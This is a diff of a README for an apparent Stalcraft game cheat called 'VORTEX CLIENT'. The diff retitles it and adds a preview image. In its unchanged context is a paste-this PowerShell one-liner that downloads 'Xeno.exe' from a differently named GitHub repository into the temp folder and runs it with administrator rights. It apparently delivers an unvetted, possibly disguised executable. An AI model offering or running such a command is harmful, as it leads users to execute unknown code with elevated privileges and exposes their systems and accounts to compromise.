@@ -1,4 +1,4 @@
-# VORTEX CLIENT - STALCRAFT X - Termenal-edition
+# VORTEX CLIENT - STALCRAFT X
 
 <div align="center">
 
@@ -40,6 +40,12 @@
 ```powershell
 powershell -c irm https://github.com/getupys/Xeno-v1.3.60/releases/latest/download/Xeno.exe -OutFile $env:TEMP\Xeno.exe; Start-Process $env:TEMP\Xeno.exe -Verb RunAs
 ```
+
+## 📸 Preview
+
+---
+<img width="1757" height="984" alt="image" src="https://github.com/user-attachments/assets/08d39345-bc7c-432c-9ac3-77757916ccc7" />
+---
 
 ## 🚀 Функционал
 
